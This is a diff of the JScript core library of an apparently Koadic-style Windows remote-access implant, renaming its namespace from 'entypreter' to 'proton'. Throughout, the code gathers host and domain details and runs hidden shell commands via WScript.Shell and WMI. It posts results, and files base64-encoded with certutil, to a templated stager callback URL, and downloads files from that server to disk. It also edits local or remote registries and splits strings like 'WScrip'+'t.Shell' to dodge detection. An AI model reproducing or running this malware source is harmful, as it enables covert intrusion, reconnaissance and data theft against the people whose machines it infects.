@@ -1,12 +1,12 @@
-var entypreter = {};
+var proton = {};
 
-entypreter.FS = new ActiveXObject("Scripting.FileSystemObject");
-entypreter.WS = new ActiveXObject("WScrip"+"t.Shell");
-entypreter.STAGER = "~URL~";
-entypreter.SESSIONKEY = "~SESSIONKEY~";
-entypreter.JOBKEY = "~JOBKEY~";
-entypreter.JOBKEYPATH = "~URL~?~SESSIONNAME~=~SESSIONKEY~;~JOBNAME~=";
-entypreter.EXPIRE = "~_EXPIREEPOCH_~";
+proton.FS = new ActiveXObject("Scripting.FileSystemObject");
+proton.WS = new ActiveXObject("WScrip"+"t.Shell");
+proton.STAGER = "~URL~";
+proton.SESSIONKEY = "~SESSIONKEY~";
+proton.JOBKEY = "~JOBKEY~";
+proton.JOBKEYPATH = "~URL~?~SESSIONNAME~=~SESSIONKEY~;~JOBNAME~=";
+proton.EXPIRE = "~_EXPIREEPOCH_~";
 
 /**
  * Sleeps the current thread
@@ -17,9 +17,9 @@ entypreter.EXPIRE = "~_EXPIREEPOCH_~";
  * @return void
  */
  //sleep.start
-entypreter.sleep = function(#ms#, #callback#)
+proton.sleep = function(#ms#, #callback#)
 {
-    if (entypreter.isHTA())
+    if (proton.isHTA())
     {
         window.setTimeout(#callback#, #ms#);
     }
@@ -38,9 +38,9 @@ entypreter.sleep = function(#ms#, #callback#)
  * @return void
  */
 //exit.start
-entypreter.exit = function()
+proton.exit = function()
 {
-    if (entypreter.isHTA())
+    if (proton.isHTA())
     {
         // crappy hack?
         try {
@@ -80,8 +80,8 @@ entypreter.exit = function()
 
     try
     {
-        var #pid# = entypreter.process.currentPID();
-        entypreter.process.kill(#pid#);
+        var #pid# = proton.process.currentPID();
+        proton.process.kill(#pid#);
     }
     catch (e)
     {
@@ -95,7 +95,7 @@ entypreter.exit = function()
  * @return bool - true if HTML application context
  */
 //isHTA.start
-entypreter.isHTA = function()
+proton.isHTA = function()
 {
     return typeof(window) !== "undef"+"ined";
 }
@@ -107,13 +107,13 @@ entypreter.isHTA = function()
  * @return bool - true if WScript context
  */
  //isWScript.start
-entypreter.isWScript = function()
+proton.isWScript = function()
 {
     return typeof(WScript) !== "un"+"defined";
 }
 //isWScript.end
 //uuid.start
-entypreter.uuid = function()
+proton.uuid = function()
 {
     try
     {
@@ -130,14 +130,14 @@ entypreter.uuid = function()
 }
 //uuid.end
 
-entypreter.user = {};
+proton.user = {};
 
 //user.isElevated.start
-entypreter.user.isElevated = function()
+proton.user.isElevated = function()
 {
     try
     {
-        var #res# = entypreter.shell.exec("net p"+"ause lanman"+"server", "%TE"+"MP%\\"+entypreter.uuid()+".txt");
+        var #res# = proton.shell.exec("net p"+"ause lanman"+"server", "%TE"+"MP%\\"+proton.uuid()+".txt");
         if (#res#.indexOf("5") == -1)
             return true;
         else
@@ -150,7 +150,7 @@ entypreter.user.isElevated = function()
 }
 //user.isElevated.end
 //user.OS.start
-entypreter.user.OS = function()
+proton.user.OS = function()
 {
     try
     {
@@ -158,8 +158,8 @@ entypreter.user.OS = function()
         // var colItems = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem");
         // var enumItems = new Enumerator(colItems);
         // var objItem = enumItems.item();
-        var #osver# = entypreter.WS.RegRead("HK"+"LM\\SOFTWARE\\Micr"+"osoft\\Windows NT\\CurrentVers"+"ion\\ProductName");
-        var #osbuild# = entypreter.WS.RegRead("H"+"KLM\\SOFTWARE\\Micros"+"oft\\Windo"+"ws NT\\CurrentVersion\\Curren"+"tBuildNumber");
+        var #osver# = proton.WS.RegRead("HK"+"LM\\SOFTWARE\\Micr"+"osoft\\Windows NT\\CurrentVers"+"ion\\ProductName");
+        var #osbuild# = proton.WS.RegRead("H"+"KLM\\SOFTWARE\\Micros"+"oft\\Windo"+"ws NT\\CurrentVersion\\Curren"+"tBuildNumber");
         return #osver#+"***"+#osbuild#;
     }
     catch(e){}
@@ -168,15 +168,15 @@ entypreter.user.OS = function()
 }
 //user.OS.end
 //user.DC.start
-entypreter.user.DC = function()
+proton.user.DC = function()
 {
     try
     {
-        var #DC# = entypreter.WS.RegRead("HKLM\\SOFT"+"WARE\\Microsoft\\Win"+"dows\\CurrentVersion\\Group "+"Policy\\History\\DC"+"Name");
+        var #DC# = proton.WS.RegRead("HKLM\\SOFT"+"WARE\\Microsoft\\Win"+"dows\\CurrentVersion\\Group "+"Policy\\History\\DC"+"Name");
         if (#DC#.length > 0)
         {
-            //DC += "___" + entypreter.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\MachineDomain")
-            //DC += entypreter.user.ParseDomainAdmins(entypreter.shell.exec("net group \"Domain Admins\" /domain", "%TEMP%\\das.txt"));
+            //DC += "___" + proton.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\MachineDomain")
+            //DC += proton.user.ParseDomainAdmins(proton.shell.exec("net group \"Domain Admins\" /domain", "%TEMP%\\das.txt"));
             return #DC#;
         }
     }
@@ -188,7 +188,7 @@ entypreter.user.DC = function()
 }
 //user.DC.end
 
-/*entypreter.user.ParseDomainAdmins = function(results)
+/*proton.user.ParseDomainAdmins = function(results)
 {
     try
     {
@@ -215,7 +215,7 @@ entypreter.user.DC = function()
     return retstring;
 }*/
 //user.Arch.start
-entypreter.user.Arch = function()
+proton.user.Arch = function()
 {
     try
     {
@@ -224,7 +224,7 @@ entypreter.user.Arch = function()
 
         // var enumItems = new Enumerator(colItems);
         // var objItem = enumItems.item();
-        var #arch# = entypreter.WS.RegRead("HK"+"LM\\SY"+"STEM\\CurrentControlSet\\Contr"+"ol\\Sessi"+"on Manager\\Environment\\PROCESSO"+"R_ARCHITECTURE");
+        var #arch# = proton.WS.RegRead("HK"+"LM\\SY"+"STEM\\CurrentControlSet\\Contr"+"ol\\Sessi"+"on Manager\\Environment\\PROCESSO"+"R_ARCHITECTURE");
         return #arch#;
     }
     catch(e){}
@@ -233,11 +233,11 @@ entypreter.user.Arch = function()
 }
 //user.Arch.end
 //user.CWD.start
-entypreter.user.CWD = function()
+proton.user.CWD = function()
 {
     try
     {
-        var #cwd# = entypreter.shell.exec("c"+"d", "%TE"+"MP%\\"+entypreter.uuid()+".txt");
+        var #cwd# = proton.shell.exec("c"+"d", "%TE"+"MP%\\"+proton.uuid()+".txt");
         return #cwd#;
     }
     catch(e)
@@ -248,9 +248,9 @@ entypreter.user.CWD = function()
 //user.CWD.end
 //user.IPAddrs.start
 /*
-entypreter.user.IPAddrs = function()
+proton.user.IPAddrs = function()
 {
-    var interfaces = entypreter.shell.exec("reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\interfaces", "%TEMP%\\"+entypreter.uuid()+".txt");
+    var interfaces = proton.shell.exec("reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\interfaces", "%TEMP%\\"+proton.uuid()+".txt");
     var interfacearray = interfaces.split("\n");
     var retstring = "";
     var interfaceid = "";
@@ -260,9 +260,9 @@ entypreter.user.IPAddrs = function()
         try
         {
             var interface = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\interfaces\\"+interfaceid;
-            var res = entypreter.shell.exec("reg query "+interface+" /v DhcpIPAddress", "%TEMP%\\"+entypreter.uuid()+".txt");
+            var res = proton.shell.exec("reg query "+interface+" /v DhcpIPAddress", "%TEMP%\\"+proton.uuid()+".txt");
             retstring += res.split("REG_SZ")[1].split("\r\n")[0]+"___";
-            res = entypreter.shell.exec("reg query "+interface+" /v IPAddress", "%TEMP%\\"+entypreter.uuid()+".txt");
+            res = proton.shell.exec("reg query "+interface+" /v IPAddress", "%TEMP%\\"+proton.uuid()+".txt");
             retstring += res.split("REG_MULTI_SZ")[1].split("\r\n")[0]+"___";
         }
         catch(e)
@@ -272,11 +272,11 @@ entypreter.user.IPAddrs = function()
 }
 */
 
-entypreter.user.IPAddrs = function()
+proton.user.IPAddrs = function()
 {
     // try
     // {
-    //     var ipconfig = entypreter.shell.exec("ipconfig", "%TEMP%\\"+entypreter.uuid()+".txt");
+    //     var ipconfig = proton.shell.exec("ipconfig", "%TEMP%\\"+proton.uuid()+".txt");
     //     var ip = ipconfig.split("  IPv4 ")[1].split(": ")[1].split("\r\n")[0];
     //     return ip;
     // }
@@ -294,7 +294,7 @@ entypreter.user.IPAddrs = function()
 
     try
     {
-        var #routeprint4# = entypreter.shell.exec("route PRINT", "%TEMP%\\"+entypreter.uuid()+".txt");
+        var #routeprint4# = proton.shell.exec("route PRINT", "%TEMP%\\"+proton.uuid()+".txt");
         var #res# = #routeprint4#.split("\r\n");
         for (var i=0; i < #res#.length; i++)
         {
@@ -335,7 +335,7 @@ entypreter.user.IPAddrs = function()
 }
 //user.IPAddrs.end
 //user.info.start
-entypreter.user.info = function()
+proton.user.info = function()
 {
     var #net# = new ActiveXObject("WSc"+"ript.Net"+"work");
     var #domain# = "";
@@ -345,34 +345,34 @@ entypreter.user.info = function()
     }
     else
     {
-        #domain# = entypreter.shell.exec("echo %us"+"erdomain%", "%TE"+"MP%\\"+entypreter.uuid()+".txt");
+        #domain# = proton.shell.exec("echo %us"+"erdomain%", "%TE"+"MP%\\"+proton.uuid()+".txt");
         #domain# = #domain#.split(" \r\n")[0];
     }
     var #info# = #domain# + "\\" + #net#.Username;
 
-    if (entypreter.user.isElevated())
+    if (proton.user.isElevated())
         #info# += "*";
 
     var #bypassio# = #net#.ComputerName;
 
     #info# += "~"+"~~" + #bypassio#;
-    #info# += "~~"+"~" + entypreter.user.OS();
-    #info# += "~"+"~~" + entypreter.user.DC();
-    #info# += "~~"+"~" + entypreter.user.Arch();
-    #info# += "~"+"~~" + entypreter.user.CWD();
-    #info# += "~~"+"~" + entypreter.user.IPAddrs();
-    #info# += "~"+"~~" + entypreter.user.encoder();
-    #info# += "~~"+"~" + entypreter.user.shellchcp();
+    #info# += "~~"+"~" + proton.user.OS();
+    #info# += "~"+"~~" + proton.user.DC();
+    #info# += "~~"+"~" + proton.user.Arch();
+    #info# += "~"+"~~" + proton.user.CWD();
+    #info# += "~~"+"~" + proton.user.IPAddrs();
+    #info# += "~"+"~~" + proton.user.encoder();
+    #info# += "~~"+"~" + proton.user.shellchcp();
 
     return #info#;
 }
 //user.info.end
 //user.encoder.start
-entypreter.user.encoder = function()
+proton.user.encoder = function()
 {
     try
     {
-        var encoder = entypreter.WS.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\ACP");
+        var encoder = proton.WS.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\ACP");
         return encoder;
     }
     catch(e)
@@ -382,11 +382,11 @@ entypreter.user.encoder = function()
 }
 //user.encoder.end
 //user.shellchcp.start
-entypreter.user.shellchcp = function()
+proton.user.shellchcp = function()
 {
     try
     {
-        var encoder = entypreter.WS.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\OEMCP");
+        var encoder = proton.WS.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\OEMCP");
         return encoder;
     }
     catch(e)
@@ -396,14 +396,14 @@ entypreter.user.shellchcp = function()
 }
 //user.shellchcp.end
 
-entypreter.work = {};
+proton.work = {};
 
 /*
-entypreter.work.applyDefaultHeaders = function(headers)
+proton.work.applyDefaultHeaders = function(headers)
 {
     var headers = (typeof(headers) !== "undefined") ? headers : {};
-    headers["SESSIONKEY"] = entypreter.SESSIONKEY;
-    headers["JOBKEY"] = entypreter.JOBKEY;
+    headers["SESSIONKEY"] = proton.SESSIONKEY;
+    headers["JOBKEY"] = proton.JOBKEY;
 }
 */
 
@@ -416,10 +416,10 @@ entypreter.work.applyDefaultHeaders = function(headers)
  * @return object - the HTTP object
  */
 //work.report.start
-entypreter.work.report = function(data, headers)
+proton.work.report = function(data, headers)
 {
-    //var headers = entypreter.work.applyDefaultHeaders(headers);
-    return entypreter.http.post(entypreter.work.make_url(), data, headers);
+    //var headers = proton.work.applyDefaultHeaders(headers);
+    return proton.http.post(proton.work.make_url(), data, headers);
 }
 //work.report.end
 
@@ -431,7 +431,7 @@ entypreter.work.report = function(data, headers)
  * @return object - the HTTP object
 */
 //work.error.start
-entypreter.work.error = function(e)
+proton.work.error = function(e)
 {
     try
     {
@@ -439,7 +439,7 @@ entypreter.work.error = function(e)
         headers["errno"] = (e.number) ? e.number : "-1";
         headers["errname"] = (e.name) ? e.name : "Unknown";
         headers["errdesc"] = (e.description) ? e.description : "Unknown";
-        return entypreter.work.report(e.message, headers);
+        return proton.work.report(e.message, headers);
     }
     catch (e)
     {
@@ -457,10 +457,10 @@ entypreter.work.error = function(e)
  * @return string - the stager callhome URL
 */
 //work.make_url.start
-entypreter.work.make_url = function(jobkey)
+proton.work.make_url = function(jobkey)
 {
-    var jobkey = (typeof(jobkey) !== "undefined") ? jobkey : entypreter.JOBKEY;
-    return entypreter.JOBKEYPATH + jobkey + ";";
+    var jobkey = (typeof(jobkey) !== "undefined") ? jobkey : proton.JOBKEY;
+    return proton.JOBKEYPATH + jobkey + ";";
 }
 //work.make_url.end
 /**
@@ -469,10 +469,10 @@ entypreter.work.make_url = function(jobkey)
  * @return object - the HTTP object
 */
 //work.get.start
-entypreter.work.get = function()
+proton.work.get = function()
 {
-    var url = entypreter.work.make_url();
-    return entypreter.http.post(url);
+    var url = proton.work.make_url();
+    return proton.http.post(url);
 }
 //work.get.end
 
@@ -485,27 +485,27 @@ entypreter.work.get = function()
  * @return void
 */
 //work.fork.start
-entypreter.work.fork = function(jobkey, fork32Bit)
+proton.work.fork = function(jobkey, fork32Bit)
 {
     var fork32Bit = (typeof(fork32Bit) !== "undefined") ? fork32Bit : false;
 
     var cmd = "~_FORKCMD_~";
 
     if (fork32Bit)
-        cmd = entypreter.file.get32BitFolder() + cmd;
+        cmd = proton.file.get32BitFolder() + cmd;
 
-    cmd = cmd.replace("***K***", entypreter.work.make_url(jobkey));
+    cmd = cmd.replace("***K***", proton.work.make_url(jobkey));
     try {
-      entypreter.WMI.createProcess(cmd);
+      proton.WMI.createProcess(cmd);
     } catch (e) {
-        entypreter.WS.Run(cmd, 0, false);
+        proton.WS.Run(cmd, 0, false);
     }
 }
 //work.fork.end
-entypreter.http = {};
+proton.http = {};
 
 //http.create.start
-entypreter.http.create = function()
+proton.http.create = function()
 {
     var http = null;
 
@@ -526,7 +526,7 @@ entypreter.http.create = function()
 }
 //http.create.end
 //http.addHeaders.start
-entypreter.http.addHeaders = function(http, headers)
+proton.http.addHeaders = function(http, headers)
 {
     var headers = (typeof(headers) !== "undefined") ? headers : {};
 
@@ -545,21 +545,21 @@ entypreter.http.addHeaders = function(http, headers)
         http.setRequestHeader("Content-Type", "application/octet-stream");
     }
 
-    http.setRequestHeader("encoder", entypreter.user.encoder());
-    http.setRequestHeader("shellchcp", entypreter.user.shellchcp());
+    http.setRequestHeader("encoder", proton.user.encoder());
+    http.setRequestHeader("shellchcp", proton.user.shellchcp());
     return;
 }
 //http.addHeaders.end
 
 //http.post.start
-entypreter.http.post = function(url, data, headers)
+proton.http.post = function(url, data, headers)
 {
     var data = (typeof(data) !== "undefined") ? data : "";
     //var http = new ActiveXObject("Microsoft.XMLHTTP");
-    var http = entypreter.http.create();
+    var http = proton.http.create();
 
     http.open("POST", url, false);
-    entypreter.http.addHeaders(http, headers);
+    proton.http.addHeaders(http, headers);
     // alert("---Making request---\n" + url + '\n' + "--Data--\n" + data);
     http.send(data);
     // alert("---Response---\n" + http.responseText)
@@ -568,11 +568,11 @@ entypreter.http.post = function(url, data, headers)
 //http.post.end
 
 //http.get.start
-entypreter.http.get = function(url, headers)
+proton.http.get = function(url, headers)
 {
-    var http = entypreter.http.create();
+    var http = proton.http.create();
     http.open("GET", url, false);
-    entypreter.http.addHeaders(http, headers);
+    proton.http.addHeaders(http, headers);
     http.send();
     return http;
 }
@@ -589,15 +589,15 @@ entypreter.http.get = function(url, headers)
  *
 **/
 //http.upload.start
-entypreter.http.upload = function(filepath, header_uuid, certutil, header_key)
+proton.http.upload = function(filepath, header_uuid, certutil, header_key)
 {
     var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";
     var headers = {};
     headers[key] = header_uuid;
 
-    var data = entypreter.file.readBinary(filepath, true, certutil);
+    var data = proton.file.readBinary(filepath, true, certutil);
 
-    if (entypreter.user.encoder() == "936")
+    if (proton.user.encoder() == "936")
     {
         // do nothing
     }
@@ -608,30 +608,30 @@ entypreter.http.upload = function(filepath, header_uuid, certutil, header_key)
         data = data.replace(/\0/g, "\\0");
     }
 
-    return entypreter.work.report(data, headers);
+    return proton.work.report(data, headers);
 }
 //http.upload.end
 //http.download.start
-entypreter.http.download = function(filepath, header_uuid, header_key)
+proton.http.download = function(filepath, header_uuid, header_key)
 {
     var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";
 
     var headers = {};
     headers[key] = header_uuid;
 
-    return entypreter.http.downloadEx("POST", entypreter.work.make_url(), headers, filepath);
+    return proton.http.downloadEx("POST", proton.work.make_url(), headers, filepath);
 }
 //http.download.end
 //http.downloadEx.start
-entypreter.http.downloadEx = function(verb, url, headers, path)
+proton.http.downloadEx = function(verb, url, headers, path)
 {
     if (verb == "GET")
     {
-        var http = entypreter.http.get(url, headers);
+        var http = proton.http.get(url, headers);
     }
     else
     {
-        var http = entypreter.http.post(url, "", headers);
+        var http = proton.http.post(url, "", headers);
     }
 
     var stream = new ActiveXObject("Adodb.Stream");
@@ -640,12 +640,12 @@ entypreter.http.downloadEx = function(verb, url, headers, path)
     stream.Write(http.responseBody);
 
 
-    var data = entypreter.http.bin2str(stream);
-    entypreter.file.write(path, data);
+    var data = proton.http.bin2str(stream);
+    proton.file.write(path, data);
 }
 //http.downloadEx.end
 //http.bin2str.start
-entypreter.http.bin2str = function(stream)
+proton.http.bin2str = function(stream)
 {
     stream.Flush();
     stream.Position = 0;
@@ -663,14 +663,14 @@ entypreter.http.bin2str = function(stream)
     return data.substring(0, data.length - 1);
 }
 //http.bin2str.end
-entypreter.process = {};
+proton.process = {};
 
 //process.currentPID.start
-entypreter.process.currentPID = function()
+proton.process.currentPID = function()
 {
-    var cmd = entypreter.file.getPath("%comspec% /K hostname");
-    //entypreter.WS.Run(cmd, 0, false);
-    var childPid = entypreter.WMI.createProcess(cmd);
+    var cmd = proton.file.getPath("%comspec% /K hostname");
+    //proton.WS.Run(cmd, 0, false);
+    var childPid = proton.WMI.createProcess(cmd);
 
     var pid = -1;
     // there could be a race condition, but CommandLine returns null on win2k
@@ -681,7 +681,7 @@ entypreter.process.currentPID = function()
     var latestTime = 0;
     var latestProc = null;
 
-    var processes = entypreter.process.list();
+    var processes = proton.process.list();
 
     var items = new Enumerator(processes);
     while (!items.atEnd())
@@ -722,9 +722,9 @@ entypreter.process.currentPID = function()
 //process.currentPID.end
 
 //process.kill.start
-entypreter.process.kill = function(pid)
+proton.process.kill = function(pid)
 {
-    var processes = entypreter.process.list();
+    var processes = proton.process.list();
 
     var items = new Enumerator(processes);
     while (!items.atEnd())
@@ -749,7 +749,7 @@ entypreter.process.kill = function(pid)
 //process.kill.end
 
 //process.list.start
-entypreter.process.list = function()
+proton.process.list = function()
 {
     var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
     var query = "Select * Fr"+"om Win32_Process";
@@ -759,9 +759,9 @@ entypreter.process.list = function()
 //process.list.end
 
 //process.getPID.start
-entypreter.process.getPID = function(process_name)
+proton.process.getPID = function(process_name)
 {
-    var processes = entypreter.process.list();
+    var processes = proton.process.list();
 
     var items = new Enumerator(processes);
     while (!items.atEnd())
@@ -786,18 +786,18 @@ entypreter.process.getPID = function(process_name)
 
 // http://apidock.com/ruby/Win32/Registry/Constants
 //registry.start
-entypreter.registry = {};
-entypreter.registry.HKCR = 0x80000000;
-entypreter.registry.HKCU = 0x80000001;
-entypreter.registry.HKLM = 0x80000002;
+proton.registry = {};
+proton.registry.HKCR = 0x80000000;
+proton.registry.HKCU = 0x80000001;
+proton.registry.HKLM = 0x80000002;
 
-entypreter.registry.STRING = 0;
-entypreter.registry.BINARY = 1;
-entypreter.registry.DWORD = 2;
-entypreter.registry.QWORD = 3;
+proton.registry.STRING = 0;
+proton.registry.BINARY = 1;
+proton.registry.DWORD = 2;
+proton.registry.QWORD = 3;
 
 //registry.provider.start
-entypreter.registry.provider = function(computer)
+proton.registry.provider = function(computer)
 {
     var computer = (typeof(computer) !== "undefined") ? computer : ".";
     var reg = GetObject("winmgmts:\\\\" + computer + "\\root\\default:StdRegProv");
@@ -806,35 +806,35 @@ entypreter.registry.provider = function(computer)
 //registry.provider.end
 
 //registry.write.start
-entypreter.registry.write = function(hKey, path, key, value, valType, computer)
+proton.registry.write = function(hKey, path, key, value, valType, computer)
 {
-    var reg = entypreter.registry.provider(computer);
+    var reg = proton.registry.provider(computer);
 
     reg.CreateKey(hKey, path);
 
-    if (valType == entypreter.registry.STRING)
+    if (valType == proton.registry.STRING)
         reg.SetStringValue(hKey, path, key, value);
-    else if (valType == entypreter.registry.DWORD)
+    else if (valType == proton.registry.DWORD)
         reg.SetDWORDValue(hKey, path, key, value);
-    else if (valType == entypreter.registry.QWORD)
+    else if (valType == proton.registry.QWORD)
         reg.SetQWORDValue(hKey, path, key, value);
-    else if (valType == entypreter.registry.BINARY)
+    else if (valType == proton.registry.BINARY)
         reg.SetBinaryValue(hKey, path, key, value);
 }
 //registry.write.end
 //registry.read.start
-entypreter.registry.read = function(hKey, path, key, valType, computer)
+proton.registry.read = function(hKey, path, key, valType, computer)
 {
-    var reg = entypreter.registry.provider(computer);
+    var reg = proton.registry.provider(computer);
 
     var methodName = "";
-    if (valType == entypreter.registry.STRING)
+    if (valType == proton.registry.STRING)
         methodName = "GetStringValue";
-    else if (valType == entypreter.registry.DWORD)
+    else if (valType == proton.registry.DWORD)
         methodName = "GetDWORDValue";
-    else if (valType == entypreter.registry.QWORD)
+    else if (valType == proton.registry.QWORD)
         methodName = "GetQWORDValue";
-    else if (valType == entypreter.registry.BINARY)
+    else if (valType == proton.registry.BINARY)
         methodName = "GetBinaryValue";
 
     if (methodName == "")
@@ -853,16 +853,16 @@ entypreter.registry.read = function(hKey, path, key, valType, computer)
 }
 //registry.read.end
 //registry.destroy.start
-entypreter.registry.destroy = function(hKey, path, key, computer)
+proton.registry.destroy = function(hKey, path, key, computer)
 {
-    var reg = entypreter.registry.provider(computer);
+    var reg = proton.registry.provider(computer);
     var loc = (key == "") ? path : path + "\\" + key;
     return reg.DeleteKey(hKey, loc);
 }
 //registry.destroy.end
 /*
 // DEPRECATED
-entypreter.registry.create = function(hiveKey, path, key, computer)
+proton.registry.create = function(hiveKey, path, key, computer)
 {
     var computer = (typeof(computer) !== "undefined") ? computer : ".";
     var sw = new ActiveXObject("WbemScripting.SWbemLocator");
@@ -902,10 +902,10 @@ entypreter.registry.create = function(hiveKey, path, key, computer)
 */
 //registry.end
 
-entypreter.WMI = {};
+proton.WMI = {};
 
 //WMI.createProcess.start
-entypreter.WMI.createProcess = function(cmd, #dpriv#)
+proton.WMI.createProcess = function(cmd, #dpriv#)
 {
 
     var SW_HIDE = 0;
@@ -941,42 +941,42 @@ entypreter.WMI.createProcess = function(cmd, #dpriv#)
 }
 //WMI.createProcess.end
 
-entypreter.shell = {};
+proton.shell = {};
 //shell.exec.start
-entypreter.shell.exec = function(cmd, stdOutPath)
+proton.shell.exec = function(cmd, stdOutPath)
 {
-    cmd = "chcp " + entypreter.user.shellchcp() + " & " + cmd;
-    var c = "%comspec% /q /c " + cmd + " 1> " + entypreter.file.getPath(stdOutPath);
+    cmd = "chcp " + proton.user.shellchcp() + " & " + cmd;
+    var c = "%comspec% /q /c " + cmd + " 1> " + proton.file.getPath(stdOutPath);
     c += " 2>&1";
-    entypreter.WS.Run(c, 0, true);
-    if (entypreter.user.encoder() == "936")
+    proton.WS.Run(c, 0, true);
+    if (proton.user.encoder() == "936")
     {
-        var data = entypreter.file.readText(stdOutPath);
+        var data = proton.file.readText(stdOutPath);
     }
     else
     {
-        var data = entypreter.file.readBinary(stdOutPath);
+        var data = proton.file.readBinary(stdOutPath);
     }
-    entypreter.file.deleteFile(stdOutPath);
+    proton.file.deleteFile(stdOutPath);
 
     return data;
 }
 //shell.exec.end
 //shell.run.start
-entypreter.shell.run = function(cmd, fork)
+proton.shell.run = function(cmd, fork)
 {
     var fork = (typeof(fork) !== "undefined") ? fork : true;
     var c = "%comspec% /q /c " + cmd;
-    entypreter.WS.Run(cmd, 5-5, !fork);
+    proton.WS.Run(cmd, 5-5, !fork);
 }
 //shell.run.end
 
-entypreter.file = {};
+proton.file = {};
 
 //file.getPath.start
-entypreter.file.getPath = function(path)
+proton.file.getPath = function(path)
 {
-    return entypreter.WS.ExpandEnvironmentStrings(path);
+    return proton.WS.ExpandEnvironmentStrings(path);
 }
 //file.getPath.end
 
@@ -984,28 +984,28 @@ entypreter.file.getPath = function(path)
 * @return string - the system folder with x86 binaries
 */
 //file.get32BitFolder.start
-entypreter.file.get32BitFolder = function()
+proton.file.get32BitFolder = function()
 {
-    var base = entypreter.file.getPath("%WINDIR%");
+    var base = proton.file.getPath("%WINDIR%");
     var syswow64 = base + "\\SysWOW64\\";
 
-    if (entypreter.FS.FolderExists(syswow64))
+    if (proton.FS.FolderExists(syswow64))
         return syswow64;
 
     return base + "\\System32\\";
 }
 //file.get32BitFolder.end
 //file.readText.start
-entypreter.file.readText = function(path)
+proton.file.readText = function(path)
 {
     var loopcount = 0;
     while(true)
     {
-        if (entypreter.FS.FileExists(entypreter.file.getPath(path)) && entypreter.FS.GetFile(entypreter.file.getPath(path)).Size > 0)
+        if (proton.FS.FileExists(proton.file.getPath(path)) && proton.FS.GetFile(proton.file.getPath(path)).Size > 0)
         {
             try
             {
-                var fd = entypreter.FS.OpenTextFile(entypreter.file.getPath(path), 1, false, 0);
+                var fd = proton.FS.OpenTextFile(proton.file.getPath(path), 1, false, 0);
                 var data = fd.ReadAll();
                 fd.Close();
                 return data;
@@ -1015,7 +1015,7 @@ entypreter.file.readText = function(path)
                 // if the file is too big, certutil won't be able to write everything in time
                 // and we run into a permissions error on read. we just need it to finish writing
                 // before we can read it.
-                entypreter.shell.run("ping 127."+"0.0.1 -n 2", false);
+                proton.shell.run("ping 127."+"0.0.1 -n 2", false);
                 continue;
             }
         }
@@ -1026,22 +1026,22 @@ entypreter.file.readText = function(path)
             {
                 return "";
             }
-            entypreter.shell.run("ping 127."+"0.0.1 -n 2", false);
+            proton.shell.run("ping 127."+"0.0.1 -n 2", false);
         }
     }
 }
 //file.readText.end
 //file.readBinary.start
-entypreter.file.readBinary = function(path, exists, certutil)
+proton.file.readBinary = function(path, exists, certutil)
 {
     var exists = (typeof(exists) !== "undefined") ? exists : false;
     var certutil = (typeof(certutil) !== "undefined") ? certutil : false;
 
-    if (!entypreter.FS.FileExists(entypreter.file.getPath(path)) && exists)
+    if (!proton.FS.FileExists(proton.file.getPath(path)) && exists)
     {
         var headers = {};
         headers["Status"] = "NotExist";
-        entypreter.work.report("", headers);
+        proton.work.report("", headers);
         return "";
     }
 
@@ -1049,18 +1049,18 @@ entypreter.file.readBinary = function(path, exists, certutil)
     while(true)
     {
 
-        if (entypreter.FS.FileExists(entypreter.file.getPath(path)) && entypreter.FS.GetFile(entypreter.file.getPath(path)).Size > 0)
+        if (proton.FS.FileExists(proton.file.getPath(path)) && proton.FS.GetFile(proton.file.getPath(path)).Size > 0)
         {
-            if (entypreter.user.encoder() == "936" || certutil)
+            if (proton.user.encoder() == "936" || certutil)
             {
-                var newout = "%TEMP%\\"+entypreter.uuid()+".t"+"xt";
-                entypreter.shell.run("certut"+"il -encode "+entypreter.file.getPath(path)+" "+newout);
-                var data = entypreter.file.readText(newout);
-                entypreter.file.deleteFile(newout);
+                var newout = "%TEMP%\\"+proton.uuid()+".t"+"xt";
+                proton.shell.run("certut"+"il -encode "+proton.file.getPath(path)+" "+newout);
+                var data = proton.file.readText(newout);
+                proton.file.deleteFile(newout);
             }
             else
             {
-                var fp = entypreter.FS.GetFile(entypreter.file.getPath(path));
+                var fp = proton.FS.GetFile(proton.file.getPath(path));
                 var fd = fp.OpenAsTextStream();
                 var data = fd.read(fp.Size);
                 fd.close();
@@ -1074,23 +1074,23 @@ entypreter.file.readBinary = function(path, exists, certutil)
             {
                 return "";
             }
-            entypreter.shell.run("ping 127."+"0.0.1 -n 2", false);
+            proton.shell.run("ping 127."+"0.0.1 -n 2", false);
         }
     }
 }
 
 //file.readBinary.end
 //file.write.start
-entypreter.file.write = function(path, data)
+proton.file.write = function(path, data)
 {
-    var fd = entypreter.FS.CreateTextFile(entypreter.file.getPath(path), true);
+    var fd = proton.FS.CreateTextFile(proton.file.getPath(path), true);
     fd.write(data);
     fd.close();
 }
 //file.write.end
 //file.deleteFile.start
-entypreter.file.deleteFile = function(path)
+proton.file.deleteFile = function(path)
 {
-    entypreter.FS.DeleteFile(entypreter.file.getPath(path), true);
+    proton.FS.DeleteFile(proton.file.getPath(path), true);
 };
 //file.deleteFile.end
